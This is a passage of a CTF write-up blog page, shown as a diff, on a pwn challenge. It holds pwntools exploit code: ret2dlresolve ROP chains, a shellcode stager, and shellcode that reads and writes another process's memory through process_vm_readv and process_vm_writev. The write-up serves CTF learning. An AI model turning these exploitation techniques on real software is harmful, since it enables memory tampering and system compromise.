+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rcx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rcx
+mov rbx, r10
+add rbx, 8
+mov rcx, 0x1
+mov qword ptr [rbx], rcx  
+
+mov r8, 1               
+mov r9, 0               
+syscall
+
+mov rax, 35  /* usleep!!
+mov rdi, 0x404200
+mov qword ptr [rdi], 1
+mov rcx, rdi
+add rcx, 8
+mov qword ptr [rcx], 0
+xor rsi, rsi
+syscall
+
+mov rax, 0x136 /* process_vm_readv
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rbx, rsi
+add rbx, 8
+mov rcx, 0x30
+mov qword ptr [rbx], rcx
+
+mov rdx, 1               
+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rbx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rbx
+mov rcx, r10
+add rcx, 8
+mov rbx, 0x30
+mov qword ptr [rcx], rbx 
+
+mov r8, 1                 
+mov r9, 0                 
+syscall
+
+mov rax, <span class="hljs-subst">{constants.SYS_write}</span>
+mov rdi, 1
+mov rsi, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span>+<span class="hljs-number">0x10</span>}</span>
+mov rdx, 0x30
+syscall
+&#x27;&#x27;&#x27;</span>)
+
+sleep(<span class="hljs-number">0.5</span>)
+p.send(sc)
+</code></pre>
+<p>However, this has bad-bytes because of the newline (0xa) character! Hence, we write a stager shellcode to call <code>SYS_read</code> on the shellcode region to write our actual shellcode:</p>
+<pre class="hljs"><code>sc_addr = <span class="hljs-number">0x404db0</span>
+read_sc = asm(<span class="hljs-string">f&#x27;&#x27;&#x27;
+mov rax, <span class="hljs-subst">{constants.SYS_read}</span>
+mov rdi, 0
+mov rsi, <span class="hljs-subst">{sc_addr-<span class="hljs-number">0x200</span>}</span>
+mov rdx, 0x1000
+syscall
+mov rax, <span class="hljs-subst">{sc_addr-<span class="hljs-number">0x200</span>}</span>
+call rax
+&#x27;&#x27;&#x27;</span>)
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(read_sc.ljust(<span class="hljs-number">0x158</span>, <span class="hljs-string">b&#x27;\x90&#x27;</span>)+p64(sc_addr))
+
+sc = asm(<span class="hljs-string">f&#x27;&#x27;&#x27;
+mov rax, 0x137
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rcx, rsi
+add rcx, 8
+mov qword ptr [rcx], 0x1 
+add rcx, 8
+mov qword ptr [rcx], 0x61
+
+mov rdx, 1             
+
+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rcx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rcx
+mov rbx, r10
+add rbx, 8
+mov rcx, 0x1
+mov qword ptr [rbx], rcx  
+
+mov r8, 1               
+mov r9, 0               
+syscall
+
+mov rax, 35
+mov rdi, 0x404200
+mov qword ptr [rdi], 1
+mov rcx, rdi
+add rcx, 8
+mov qword ptr [rcx], 0
+xor rsi, rsi
+syscall
+
+mov rax, 0x136
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rbx, rsi
+add rbx, 8
+mov rcx, 0x30
+mov qword ptr [rbx], rcx
+
+mov rdx, 1               
+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rbx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rbx
+mov rcx, r10
+add rcx, 8
+mov rbx, 0x30
+mov qword ptr [rcx], rbx 
+
+mov r8, 1                 
+mov r9, 0                 
+syscall
+
+mov rax, <span class="hljs-subst">{constants.SYS_write}</span>
+mov rdi, 1
+mov rsi, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span>+<span class="hljs-number">0x10</span>}</span>
+mov rdx, 0x30
+syscall
+&#x27;&#x27;&#x27;</span>)
+
+sleep(<span class="hljs-number">0.5</span>)
+p.send(sc)
+</code></pre>
+<p>This gives us the flag!
+<img src="/images/2025-12-14-10-58-51.png"alt="flag"loading="lazy"decoding="async"width="1478"height="846"></p>
+<h2 id="the-unintended-way"tabindex="-1">The Unintended Way</h2>
+<p>This solution is not dissimilar from the intended in that both use <code>mprotect</code> in the end to write shellcode.
+The target of interest is this unintended <code>memset</code> call left by the author:</p>
+<pre class="hljs"><code>   0x000000000040148b &lt;+152&gt;:	lea    rax,[rbp-0x140]
+   0x0000000000401492 &lt;+159&gt;:	mov    esi,ecx
+   0x0000000000401494 &lt;+161&gt;:	mov    rdi,rax
+   0x0000000000401497 &lt;+164&gt;:	call   0x401070 &lt;memset@plt&gt;
+   0x000000000040149c &lt;+169&gt;:	mov    rdx,QWORD PTR [rip+0x2bdd]        # 0x404080 &lt;stdin@GLIBC_2.2.5&gt;
+   0x00000000004014a3 &lt;+176&gt;:	lea    rax,[rbp-0x110]
+   0x00000000004014aa &lt;+183&gt;:	mov    esi,0x150
+   0x00000000004014af &lt;+188&gt;:	mov    rdi,rax
+   0x00000000004014b2 &lt;+191&gt;:	call   0x401080 &lt;fgets@plt&gt;
+   0x00000000004014b7 &lt;+196&gt;:	mov    eax,0x0
+   0x00000000004014bc &lt;+201&gt;:	leave
+   0x00000000004014bd &lt;+202&gt;:	ret
+</code></pre>
+<p>Because of this, we can instead use one ret2dlresolve to replace <code>memset()</code> with <code>puts()</code>, and then set our <code>rbp</code> to point to the <code>fgets</code> GOT entry with the added offset. This gives us a LIBC leak, that we can eventually use to stage an <code>mprotect</code> chain on the LIBC writable area:</p>
+<pre class="hljs"><code>p.recvuntil(<span class="hljs-string">b&#x27;mapped at &#x27;</span>)
+mem = <span class="hljs-built_in">int</span>(p.recvline().strip(), <span class="hljs-number">16</span>)
+log.info(<span class="hljs-string">&quot;mem, %#x&quot;</span>, mem)
+p.recvuntil(<span class="hljs-string">b&#x27;PID: &#x27;</span>)
+pid = <span class="hljs-built_in">int</span>(p.recvline().strip())
+
+dlresolve = Ret2dlresolvePayload(elf, symbol=<span class="hljs-string">&#x27;puts&#x27;</span>, args=[], data_addr=data_addr+<span class="hljs-number">0x30</span>)
+
+elf64_rel = dlresolve.payload[-<span class="hljs-number">24</span>:]
+elf64_rel = p64(elf.got.memset) + elf64_rel[<span class="hljs-number">8</span>:]
+resolve_payload = dlresolve.payload[:-<span class="hljs-number">24</span>] + elf64_rel
+
+<span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(resolve_payload))
+
+rop = ROP(elf)
+rop.ret2dlresolve(dlresolve)
+
+<span class="hljs-built_in">print</span>(rop.dump())
+
+rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">0x118</span>)
+rop1.rbp = data_addr+<span class="hljs-number">0x110</span>
+rop1.raw(<span class="hljs-number">0x000000000040149c</span>)
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+
+rop1 = ROP(elf)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">8</span>)
+rop1.raw(rop.chain())
+rop1.rbp = elf.got.fgets+<span class="hljs-number">0x140</span>
+rop1.raw(<span class="hljs-number">0x40148b</span>)
+rop1.raw(resolve_payload)
+rop1.raw(<span class="hljs-string">b&#x27;A&#x27;</span>*(<span class="hljs-number">0x118</span>-<span class="hljs-built_in">len</span>(rop1.chain())))
+rop1.rbp = data_addr
+rop1.raw(<span class="hljs-built_in">next</span>(elf.search(asm(<span class="hljs-string">&#x27;leave; ret&#x27;</span>))))
+
+sleep(<span class="hljs-number">0.5</span>)
+p.sendline(rop1.chain())
+
+p.recv(<span class="hljs-number">1</span>)
+libc.address = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\0&#x27;</span>*<span class="hljs-number">2</span>) - libc.sym.fgets
+log.info(<span class="hljs-string">&quot;libc.address, %#x&quot;</span>, libc.address)
+</code></pre>
+<p>From there, it was possible to avoid using the usleep syscall and instead opt for the LIBC sleep:</p>
+<pre class="hljs"><code>sc = asm(<span class="hljs-string">f&#x27;&#x27;&#x27;
+mov rax, 0x137
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rcx, rsi
+add rcx, 8
+mov qword ptr [rcx], 0x1 
+add rcx, 8
+mov qword ptr [rcx], 0x61
+
+mov rdx, 1             
+
+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rcx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rcx
+mov rbx, r10
+add rbx, 8
+mov rcx, 0x1
+mov qword ptr [rbx], rcx  
+
+mov r8, 1               
+mov r9, 0               
+syscall
+
+mov rax, <span class="hljs-subst">{libc.sym.sleep}</span>
+mov rdi, 0x1
+call rax
+
+mov rax, 0x136
+mov rdi, <span class="hljs-subst">{pid}</span>
+
+mov rsi, 0x404ab0
+mov rbx, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x10</span>}</span>
+mov qword ptr [rsi], rbx
+mov rbx, rsi
+add rbx, 8
+mov rcx, 0x30
+mov qword ptr [rbx], rcx
+
+mov rdx, 1               
+mov r10, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span> + <span class="hljs-number">0x50</span>}</span>
+mov rbx, <span class="hljs-subst">{mem}</span>
+mov qword ptr [r10], rbx
+mov rcx, r10
+add rcx, 8
+mov rbx, 0x30
+mov qword ptr [rcx], rbx 
+
+mov r8, 1                 
+mov r9, 0                 
+syscall
+
+mov rax, <span class="hljs-subst">{constants.SYS_write}</span>
+mov rdi, 1
+mov rsi, <span class="hljs-subst">{<span class="hljs-number">0x404ab0</span>+<span class="hljs-number">0x10</span>}</span>
+mov rdx, 0x30
+syscall
+&#x27;&#x27;&#x27;</span>)
+
+
+sleep(<span class="hljs-number">0.5</span>)
+p.send(sc)
+</code></pre>
+<h2 id="thoughts-and-conclusions"tabindex="-1">Thoughts and Conclusions</h2>
+<p>All in all, this was one of the most creative ROP problems I’ve tried! The concept of using ret2dlresolve not to get a shell with a straightforward <code>system()</code> but rather to stage the next part of the attack leading to shellcode was a very innovative challenge setup.</p>
+<p>With regards to the pwn meta of local CTFs, FS’s challenge has really given a refreshing look on local pwn, one that isn’t just ret2libc or UAF slop. His challenges in the qualifiers as well as the finals were unique and fun. I rate the pwn challenges from this particular CTF a 10/10.</p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/0.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">Sieberrsec CTF 2025</p>
+                <p class="article-navigation-subtitle">Writeups for qualifiers and finals of Sieberrsec CTF 2025</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/2.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">BlahajCTF 2025</p>
+                <p class="article-navigation-subtitle">Writeup for the pwn challenge fastnotes by FS in BlahajCTF 2025</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
